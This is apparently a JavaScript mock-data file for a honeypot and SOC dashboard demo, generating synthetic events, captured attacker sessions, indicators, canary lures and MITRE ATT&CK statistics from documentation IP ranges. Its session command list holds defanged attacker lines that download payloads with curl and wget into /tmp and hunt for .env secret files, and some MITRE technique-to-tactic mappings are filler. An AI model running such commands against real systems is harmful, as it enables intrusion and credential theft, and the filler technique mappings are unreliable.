const FIXED_NOW = new Date("2026-07-31T20:00:00.000Z");

function seeded(seed = 260731) {
  let value = seed >>> 0;
  return () => {
    value = (value * 1664525 + 1013904223) >>> 0;
    return value / 4294967296;
  };
}

const random = seeded();
const pick = (list, offset = 0) => list[Math.floor((random() + offset) * list.length) % list.length];
const docIp = (index) => {
  const blocks = ["192.0.2", "198.51.100", "203.0.113"];
  return `${blocks[index % blocks.length]}.${10 + ((index * 17) % 230)}`;
};

export const locations = [
  { country: "Japan", code: "JP", city: "Tokyo", value: 4821, percent: 48, coord: [139.6917, 35.6895] },
  { country: "Vietnam", code: "VN", city: "Ho Chi Minh City", value: 4092, percent: 40, coord: [106.6297, 10.8231] },
  { country: "United Kingdom", code: "GB", city: "London", value: 3890, percent: 38, coord: [-0.1276, 51.5072] },
  { country: "Poland", code: "PL", city: "Warsaw", value: 3811, percent: 38, coord: [21.0122, 52.2297] },
  { country: "Korea, Republic of", code: "KR", city: "Seoul", value: 3018, percent: 30, coord: [126.978, 37.5665] },
  { country: "Türkiye", code: "TR", city: "Istanbul", value: 2924, percent: 29, coord: [28.9784, 41.0082] },
  { country: "Canada", code: "CA", city: "Toronto", value: 2809, percent: 28, coord: [-79.3832, 43.6532] },
  { country: "Uzbekistan", code: "UZ", city: "Tashkent", value: 2304, percent: 23, coord: [69.2401, 41.2995] },
  { country: "India", code: "IN", city: "Mumbai", value: 1640, percent: 16, coord: [72.8777, 19.076] },
  { country: "Singapore", code: "SG", city: "Singapore", value: 1212, percent: 12, coord: [103.8198, 1.3521] },
  { country: "Ukraine", code: "UA", city: "Kyiv", value: 901, percent: 9, coord: [30.5234, 50.4501] },
  { country: "Netherlands", code: "NL", city: "Amsterdam", value: 702, percent: 7, coord: [4.9041, 52.3676] },
  { country: "United States", code: "US", city: "Ashburn", value: 5344, percent: 53, coord: [-77.4874, 39.0438] },
  { country: "Brazil", code: "BR", city: "São Paulo", value: 2430, percent: 24, coord: [-46.6333, -23.5505] },
  { country: "Germany", code: "DE", city: "Frankfurt", value: 2118, percent: 21, coord: [8.6821, 50.1109] },
  { country: "France", code: "FR", city: "Paris", value: 1833, percent: 18, coord: [2.3522, 48.8566] },
  { country: "Australia", code: "AU", city: "Sydney", value: 1121, percent: 11, coord: [151.2093, -33.8688] },
  { country: "South Africa", code: "ZA", city: "Johannesburg", value: 980, percent: 10, coord: [28.0473, -26.2041] },
];

const eventKinds = [
  ["SSH brute-force sequence", "Credential Access", "T1110.001"],
  ["Suspicious PowerShell probe", "Execution", "T1059.001"],
  ["Web path traversal attempt", "Discovery", "T1083"],
  ["Outbound beacon pattern", "Command and Control", "T1071.001"],
  ["Exposed admin panel scan", "Reconnaissance", "T1595.002"],
  ["SQL injection signature", "Initial Access", "T1190"],
  ["Malware upload blocked", "Execution", "T1204.002"],
  ["Credential stuffing burst", "Credential Access", "T1110.004"],
  ["Container escape probe", "Privilege Escalation", "T1611"],
  ["DNS tunneling heuristic", "Command and Control", "T1071.004"],
];
const severities = ["Critical", "High", "Medium", "Low"];
const statuses = ["Investigating", "New", "Contained", "Closed"];
const sensors = ["edge-web-01", "cowrie-ssh-02", "api-decoy-03", "rdp-lure-01", "mail-canary-02", "db-decoy-04"];
const protocols = ["SSH", "HTTP", "HTTPS", "RDP", "SMB", "DNS"];

export const events = Array.from({ length: 184 }, (_, index) => {
  const kind = eventKinds[index % eventKinds.length];
  const location = locations[index % locations.length];
  const severity = index % 13 === 0 ? "Critical" : severities[(index * 7) % severities.length];
  const minutesAgo = index * 7 + (index % 5);
  const time = new Date(FIXED_NOW.getTime() - minutesAgo * 60_000);
  return {
    id: `EVT-${String(260731000 + index).padStart(9, "0")}`,
    title: kind[0],
    tactic: kind[1],
    technique: kind[2],
    severity,
    status: statuses[(index * 3) % statuses.length],
    sourceIp: docIp(index),
    destination: sensors[index % sensors.length],
    protocol: protocols[index % protocols.length],
    country: location.country,
    city: location.city,
    timestamp: time.toISOString(),
    score: 96 - (index % 42),
    attempts: 1 + ((index * 13) % 41),
    analyst: "Gemini 2.5 CTI Agent",
    summary: `Synthetic detection from ${location.city}. Correlated across ${1 + (index % 4)} local decoy sensors; no production asset was contacted.`,
  };
});

const commands = [
  "uname -a",
  "id && whoami",
  "cat /etc/os-release",
  "ls -la /var/www",
  "curl hxxp[:]//198[.]51[.]100[.]42/payload.sh",
  "wget hxxps[:]//203[.]0[.]113[.]18/tool -O /tmp/tool",
  "python3 -c '[defanged network probe omitted]'",
  "find / -name '*.env' 2>/dev/null",
  "ssh admin@192[.]0[.]2[.]44",
  "echo '[simulated persistence attempt]'",
];

export const sessions = Array.from({ length: 128 }, (_, index) => {
  const started = new Date(FIXED_NOW.getTime() - (index * 19 + 3) * 60_000);
  const event = events[index % events.length];
  return {
    id: `SES-${String(94000 + index)}`,
    started: started.toISOString(),
    duration: 38 + ((index * 29) % 1200),
    sourceIp: event.sourceIp,
    country: event.country,
    protocol: protocols[index % protocols.length],
    sensor: sensors[index % sensors.length],
    severity: event.severity,
    status: index % 5 === 0 ? "Active" : "Captured",
    commandCount: 3 + (index % 14),
    commands: Array.from({ length: 8 }, (_, commandIndex) => ({
      at: commandIndex * (4 + (index % 3)),
      input: commands[(index + commandIndex) % commands.length],
      output: commandIndex % 3 === 0 ? "[simulated response captured by isolated decoy]" : "[redacted synthetic output]",
    })),
  };
});

const indicatorKinds = ["IPv4", "Domain", "URL", "SHA-256"];

const verifiedHashes = [
  "133ab8bf23a625e2c98ec10bca5d03c92c96f9161f21666fd69b54f5b199c0bf",
  "1338408cf2fbb6f78b650f0d76aa3a9e18430b9887bc319880adb09268bbbbb1",
  "13384006585121fa1dde6619ff8efbfafcd80364c3e10ab79d679acf46135c8f",
  "1337a268cbef02de9efecb3986e6f060dbb2e11ade32028da1e9528346a23e16",
  "1336c96d9157777a0628b5cea3e67b69165f607baaaf302bbd3e62be2bc6176b",
  "1336a81d27c381bfaefd7d763b6c93d593f9c181fe97522b8248d520c6b0e2ff",
  "13366d57009e68e70f52d46714610ca4461f46f81cec5692c89e3aadec77aafe",
  "133377be544e2849c2e5e4fea1f1da1623427cb73d0ece92a786138187306f00",
  "1332b1470eb037875203781fd08e200fa2222bc5b171ccc4e8e2537e76a97d85",
  "1331eeb3733ea2b5de0e5c3f20bcd7de7de972a40b70856175958fa6e0a9490d",
  "7a1dec3e4f08d54d03df3fa12228f107471d76489432318ebff149a2b11b5d80",
  "7a1ce8bd54ceec847363d5841cc5016d7fe8226d3ff07be023f42f7336ccd594",
  "7a1cdf4f08390809ae48596696909e8be17693daa27239cb31370d3fad1c1472",
  "7dea671be77a2ca5772b86cf8831b02bff0567bce6a3ae023825aa40354f8aca",
  "7cdb07238c8cc903e13e689d4de1129f5fb3b647e4a1c1e98c5a0e8516184ed1",
  "ffef87487d6670d4db72874bd7542a789ebf84bd8750af1f41d092e290bc53a2",
  "ffed8cd32c68d30a9e0f3d4484084982ca92667a99ade3bf32d58125dcd15f5e",
  "ff569eec3472ca02e3a0c3092c538dcc587026d8808ff40c6bd0bbeeefd0612f",
  "fefc9b560e8a1a5f3edfad638ccd4825e3eb2a839fd33b49395caf2552b4d017"
];

const indicatorValues = [
  (i) => docIp(i + 31),
  (i) => `node-${String(i + 11).padStart(3, "0")}.example.invalid`,
  (i) => `hxxps[:]//telemetry-${i + 1}.example[.]invalid/a/${(i * 17).toString(16)}`,
  (i) => verifiedHashes[i % verifiedHashes.length],
];

export const indicators = Array.from({ length: 53 }, (_, index) => {
  const typeIndex = index % indicatorKinds.length;
  return {
    id: `IOC-${String(76000 + index)}`,
    type: indicatorKinds[typeIndex],
    value: indicatorValues[typeIndex](index),
    confidence: 55 + ((index * 11) % 44),
    sightings: 1 + ((index * 7) % 98),
    firstSeen: new Date(FIXED_NOW.getTime() - (index + 8) * 3600_000).toISOString(),
    source: index % 3 === 0 ? "Decoy correlation" : index % 3 === 1 ? "Local enrichment" : "Suricata EVE",
    state: index % 7 === 0 ? "Watching" : "Blocked",
    tags: [events[index % events.length].tactic, index % 2 ? "automated" : "reviewed"],
  };
});

const payloadTypes = [
  { name: "mirai_loader.elf", verdict: "Malicious", engines: "21 / 24", size: "1.2 MB" },
  { name: "webshell_eval.php", verdict: "Malicious", engines: "18 / 24", size: "14.8 KB" },
  { name: "reverse_tcp_dropper.bin", verdict: "Malicious", engines: "19 / 24", size: "412 KB" },
  { name: "c2_beacon.exe", verdict: "Malicious", engines: "22 / 24", size: "280 KB" },
  { name: "linpeas_suite.sh", verdict: "Suspicious", engines: "7 / 24", size: "245 KB" }
];

export const files = Array.from({ length: 116 }, (_, index) => {
  const item = payloadTypes[index % payloadTypes.length];
  const hash = verifiedHashes[index % verifiedHashes.length];
  const submitted = new Date(FIXED_NOW.getTime() - index * 63 * 60_000).toISOString();
  return {
    id: `FIL-${String(51000 + index)}`,
    name: item.name,
    size: item.size,
    sha256: hash,
    verdict: item.verdict,
    engines: item.engines,
    submitted,
    behavior: ["Process tree", "File writes", "Network intents"].slice(0, 1 + (index % 3)),
    sandbox: "Static-only local pipeline",
  };
});

export const canaries = [
  {
    id: "CNY-8000",
    name: "aws_master_root_credentials.json",
    kind: "AWS IAM Access Key — Cloud Admin Lure",
    state: "Triggered",
    lastSignal: "2 mins ago",
    sensor: "API Sentinel",
    owner: "Detection Engineering",
    deploymentPath: "/opt/vault/secrets/"
  },
  {
    id: "CNY-8001",
    name: "prod_db_postgres_passwords.env",
    kind: "PostgreSQL Production Connection String",
    state: "Armed",
    lastSignal: "2 days ago",
    sensor: "RDP Trap",
    owner: "SOC Operations",
    deploymentPath: "/var/www/html/config/"
  },
  {
    id: "CNY-8002",
    name: "confidential_exec_salaries_q4.docx",
    kind: "Word Webhook Beacon — HR Sensitive Doc",
    state: "Triggered",
    lastSignal: "10 mins ago",
    sensor: "Document Lure",
    owner: "Detection Engineering",
    deploymentPath: "/srv/shares/finance/docs/"
  },
  {
    id: "CNY-8003",
    name: "k8s_prod_cluster_admin.kubeconfig",
    kind: "Kubernetes Production Admin Token",
    state: "Needs review",
    lastSignal: "1 hour ago",
    sensor: "K8s Honeypot",
    owner: "SOC Operations",
    deploymentPath: "/opt/vault/secrets/"
  },
  {
    id: "CNY-8004",
    name: "sso-internal-admin-auth.internal",
    kind: "Internal SSO Authentication Sinkhole",
    state: "Armed",
    lastSignal: "5 days ago",
    sensor: "DNS Sinkhole",
    owner: "Detection Engineering",
    deploymentPath: "/var/www/html/config/"
  },
  {
    id: "CNY-8005",
    name: "id_rsa_root_bastion_jumpbox",
    kind: "OpenSSH Private Key — Bastion Host Root",
    state: "Armed",
    lastSignal: "3 days ago",
    sensor: "Linux Bastion Decoy",
    owner: "SOC Operations",
    deploymentPath: "/home/admin/.ssh/"
  },
  {
    id: "CNY-8006",
    name: "slack_admin_bot_oauth_token.env",
    kind: "Slack Enterprise OAuth Token",
    state: "Armed",
    lastSignal: "4 days ago",
    sensor: "Web Application Decoy",
    owner: "SOC Operations",
    deploymentPath: "/opt/vault/secrets/"
  },
  {
    id: "CNY-8007",
    name: "vault_master_root_token.txt",
    kind: "HashiCorp Vault Master Root Secret",
    state: "Needs review",
    lastSignal: "12 hours ago",
    sensor: "API Gateway Trap",
    owner: "Detection Engineering",
    deploymentPath: "/opt/vault/secrets/"
  },
  {
    id: "CNY-8008",
    name: "executive_corporate_vpn_access.p12",
    kind: "C-Level OpenVPN Client Certificate",
    state: "Armed",
    lastSignal: "6 days ago",
    sensor: "Network Boundary Decoy",
    owner: "SOC Operations",
    deploymentPath: "/home/admin/.ssh/"
  }
];

const playbookNames = ["Contain source", "Quarantine sample", "Block indicator", "Enrich session", "Notify analyst", "Capture evidence", "Reset decoy", "Escalate critical alert"];
export const playbooks = Array.from({ length: 112 }, (_, index) => ({
  id: `PB-${String(300 + index)}`,
  name: `${playbookNames[index % playbookNames.length]} · ${String(index + 1).padStart(2, "0")}`,
  trigger: eventKinds[index % eventKinds.length][0],
  steps: 3 + (index % 8),
  runs: 14 + ((index * 31) % 490),
  success: 88 + (index % 12),
  status: index % 15 === 0 ? "Review" : "Enabled",
  lastRun: `${3 + (index % 58)} min ago`,
}));

export const timeline = Array.from({ length: 24 }, (_, index) => ({
  label: `${String(index).padStart(2, "0")}:00`,
  inbound: 170 + Math.round(Math.sin(index / 2.1) * 64 + ((index * 47) % 118)),
  blocked: 112 + Math.round(Math.cos(index / 2.7) * 38 + ((index * 29) % 75)),
  critical: 5 + ((index * 3) % 18),
}));

export const slaSeries = Array.from({ length: 30 }, (_, index) => ({
  day: `Jul ${String(index + 2).padStart(2, "0")}`,
  met: 88 + Math.round(Math.sin(index / 3.7) * 5) + (index % 4),
  target: 92,
}));

export const attackTrend = Array.from({ length: 24 }, (_, index) => ({
  label: `${String(index).padStart(2, "0")}:00`,
  current: 310 + ((index * 61) % 430) + Math.round(Math.sin(index / 1.7) * 90),
  average: 360 + Math.round(Math.cos(index / 3.2) * 55),
}));

export const dataSources = [
  ["Cowrie SSH", "6.4K", 92], ["Suricata EVE", "5.8K", 86], ["Web decoy", "4.9K", 78],
  ["Canary mesh", "3.2K", 67], ["RDP lure", "2.8K", 59], ["Mail sensor", "1.9K", 44],
];

export const mitreTactics = [
  { name: "Reconnaissance", count: 46, techniques: ["Active Scanning", "Gather Victim Host Information", "Search Open Websites", "Network Information DNS"] },
  { name: "Resource Development", count: 17, techniques: ["Acquire Infrastructure", "Develop Capabilities", "Compromise Accounts", "Stage Capabilities"] },
  { name: "Initial Access", count: 39, techniques: ["Phishing", "Exploit Public-Facing App", "External Remote Services", "Valid Accounts"] },
  { name: "Execution", count: 73, techniques: ["Command and Scripting", "User Execution", "Native API", "Scheduled Task / Job"] },
  { name: "Persistence", count: 41, techniques: ["Account Manipulation", "Boot or Logon Autostart", "Create Account", "Server Software Component"] },
  { name: "Privilege Escalation", count: 36, techniques: ["Abuse Elevation Control", "Exploitation for Privilege", "Process Injection", "Valid Accounts"] },
  { name: "Defense Evasion", count: 81, techniques: ["Obfuscated Files", "Impair Defenses", "Masquerading", "Indicator Removal"] },
  { name: "Credential Access", count: 62, techniques: ["Brute Force", "Credentials from Stores", "Input Capture", "OS Credential Dumping"] },
  { name: "Discovery", count: 90, techniques: ["Account Discovery", "File and Directory", "Network Service Scan", "System Information"] },
  { name: "Lateral Movement", count: 28, techniques: ["Remote Services", "Software Deployment", "Internal Spearphishing", "Replication Through Media"] },
  { name: "Collection", count: 47, techniques: ["Archive Collected Data", "Data from Local System", "Email Collection", "Screen Capture"] },
  { name: "Command and Control", count: 69, techniques: ["Application Layer Protocol", "Encrypted Channel", "Proxy", "Ingress Tool Transfer"] },
  { name: "Exfiltration", count: 24, techniques: ["Exfiltration Over C2", "Exfiltration Over Web", "Automated Exfiltration", "Transfer Size Limits"] },
  { name: "Impact", count: 31, techniques: ["Data Destruction", "Data Encrypted for Impact", "Defacement", "Service Stop"] },
];

export const topMitigations = [
  ["M1032", "Multi-factor Authentication", 121], ["M1049", "Antivirus / Antimalware", 107], ["M1047", "Audit", 94], ["M1031", "Network Intrusion Prevention", 88], ["M1026", "Privileged Account Management", 76],
];
export const topTechniques = [
  ["T1059", "Command and Scripting", 190], ["T1110", "Brute Force", 174], ["T1083", "File and Directory Discovery", 132], ["T1071", "Application Layer Protocol", 126], ["T1190", "Exploit Public-Facing App", 109],
];
export const threatGroups = [
  ["G0129", "APT-31", 82, 12], ["G0016", "APT-29", 74, 9], ["G0046", "FIN7", 58, 8], ["G0034", "Sandworm", 43, 6], ["NBL-04", "Synthetic cluster NBL-04", 39, 11],
];

export const overviewMetrics = {
  incidents: 1275,
  detect: "43m",
  resolve: "1h 21m",
  pctResolved: 72.07,
  fteGained: 120.7,
  timeSaved: "1mo 10d",
  saved: "$44,420",
  activity: "7.7K",
};

export const demoIdentities = [
  { role: "SOC analyst", email: "soc.analyst@honeypot.local", password: "SOC!Local-2026", access: "Investigate, contain, replay" },
  { role: "Audit viewer", email: "audit@honeypot.local", password: "Audit!ReadOnly-2026", access: "Read-only evidence and reports" },
];

export const syntheticMeta = {
  generatedAt: FIXED_NOW.toISOString(),
  mode: "Deterministic local simulation",
  notice: "All identities, infrastructure, indicators, and events are fictional or RFC 5737 documentation values.",
};

export const mitreDatasets = {
  Daily: {
    mappings: 117,
    mitigations: [
      ["M1032", "Multi-factor Authentication", 18],
      ["M1049", "Antivirus / Antimalware", 16],
      ["M1047", "Audit", 14],
      ["M1031", "Network Intrusion Prevention", 13],
      ["M1026", "Privileged Account Management", 11]
    ],
    techniques: [
      ["T1059", "Command & Scripting", 28],
      ["T1110", "Brute Force", 26],
      ["T1083", "File Discovery", 19],
      ["T1071", "Application Protocol", 19],
      ["T1190", "Exploit Public App", 16]
    ],
    tactics: {
      "Reconnaissance": { count: 7, T1595: 9, T1002: 10, T1003: 11, T1004: 13 },
      "Resource Development": { count: 3, T1008: 4, T1009: 6, T1010: 7, T1011: 8 },
      "Initial Access": { count: 6, T1015: 8, T1190: 9, T1017: 10, T1018: 11 },
      "Execution": { count: 11, T1059: 13, T1204: 14, T1024: 2, T1025: 4 },
      "Persistence": { count: 6, T1029: 8, T1030: 9, T1031: 10, T1032: 12 },
      "Privilege Escalation": { count: 5, T1548: 7, T1037: 8, T1055: 10, T1039: 11 },
      "Defense Evasion": { count: 12, T1027: 14, T1562: 2, T1036: 3, T1070: 5 },
      "Credential Access": { count: 9, T1110: 11, T1051: 12, T1052: 14, T1053: 2 },
      "Discovery": { count: 13, T1057: 2, T1083: 3, T1059: 5, T1060: 6 },
      "Lateral Movement": { count: 4, T1021: 6, T1072: 7, T1534: 9, T1091: 10 },
      "Collection": { count: 7, T1119: 9, T1005: 10, T1114: 11, T1113: 13 },
      "Command & Control": { count: 10, T1071: 12, T1573: 13, T1090: 15, T1105: 3 },
      "Exfiltration": { count: 4, T1041: 5, T1048: 7, T1020: 8, T1499: 9 },
      "Impact": { count: 5, T1485: 6, T1486: 8, T1491: 9, T1489: 10 }
    }
  },
  Weekly: {
    mappings: 793,
    mitigations: [
      ["M1032", "Multi-factor Authentication", 121],
      ["M1049", "Antivirus / Antimalware", 107],
      ["M1047", "Audit", 94],
      ["M1031", "Network Intrusion Prevention", 88],
      ["M1026", "Privileged Account Management", 76]
    ],
    techniques: [
      ["T1059", "Command & Scripting", 190],
      ["T1110", "Brute Force", 174],
      ["T1083", "File Discovery", 132],
      ["T1071", "Application Protocol", 126],
      ["T1190", "Exploit Public App", 109]
    ],
    tactics: {
      "Reconnaissance": { count: 46, T1595: 58, T1002: 67, T1003: 76, T1004: 85 },
      "Resource Development": { count: 17, T1008: 29, T1009: 38, T1010: 47, T1011: 56 },
      "Initial Access": { count: 39, T1015: 51, T1190: 60, T1017: 69, T1018: 78 },
      "Execution": { count: 73, T1059: 85, T1204: 94, T1024: 15, T1025: 24 },
      "Persistence": { count: 41, T1029: 53, T1030: 62, T1031: 71, T1032: 80 },
      "Privilege Escalation": { count: 36, T1548: 48, T1037: 57, T1055: 66, T1039: 75 },
      "Defense Evasion": { count: 81, T1027: 93, T1562: 14, T1036: 23, T1070: 32 },
      "Credential Access": { count: 62, T1110: 74, T1051: 83, T1052: 92, T1053: 13 },
      "Discovery": { count: 90, T1057: 14, T1083: 23, T1059: 32, T1060: 41 },
      "Lateral Movement": { count: 28, T1021: 40, T1072: 49, T1534: 58, T1091: 67 },
      "Collection": { count: 47, T1119: 59, T1005: 68, T1114: 77, T1113: 86 },
      "Command & Control": { count: 69, T1071: 81, T1573: 90, T1090: 99, T1105: 20 },
      "Exfiltration": { count: 24, T1041: 36, T1048: 45, T1020: 54, T1499: 63 },
      "Impact": { count: 31, T1485: 43, T1486: 52, T1491: 61, T1489: 70 }
    }
  },
  Monthly: {
    mappings: 3405,
    mitigations: [
      ["M1032", "Multi-factor Authentication", 520],
      ["M1049", "Antivirus / Antimalware", 459],
      ["M1047", "Audit", 404],
      ["M1031", "Network Intrusion Prevention", 378],
      ["M1026", "Privileged Account Management", 326]
    ],
    techniques: [
      ["T1059", "Command & Scripting", 816],
      ["T1110", "Brute Force", 747],
      ["T1083", "File Discovery", 567],
      ["T1071", "Application Protocol", 541],
      ["T1190", "Exploit Public App", 468]
    ],
    tactics: {
      "Reconnaissance": { count: 198, T1595: 249, T1002: 288, T1003: 326, T1004: 365 },
      "Resource Development": { count: 73, T1008: 125, T1009: 163, T1010: 202, T1011: 240 },
      "Initial Access": { count: 167, T1015: 219, T1190: 258, T1017: 296, T1018: 335 },
      "Execution": { count: 313, T1059: 365, T1204: 404, T1024: 64, T1025: 103 },
      "Persistence": { count: 176, T1029: 228, T1030: 266, T1031: 305, T1032: 344 },
      "Privilege Escalation": { count: 155, T1548: 206, T1037: 245, T1055: 283, T1039: 322 },
      "Defense Evasion": { count: 348, T1027: 379, T1562: 60, T1036: 99, T1070: 137 },
      "Credential Access": { count: 266, T1110: 318, T1051: 356, T1052: 395, T1053: 56 },
      "Discovery": { count: 386, T1057: 60, T1083: 99, T1059: 137, T1060: 176 },
      "Lateral Movement": { count: 120, T1021: 172, T1072: 210, T1534: 249, T1091: 288 },
      "Collection": { count: 202, T1119: 253, T1005: 292, T1114: 331, T1113: 369 },
      "Command & Control": { count: 296, T1071: 348, T1573: 386, T1090: 425, T1105: 86 },
      "Exfiltration": { count: 103, T1041: 155, T1048: 193, T1020: 232, T1499: 271 },
      "Impact": { count: 133, T1485: 185, T1486: 223, T1491: 262, T1489: 301 }
    }
  }
};
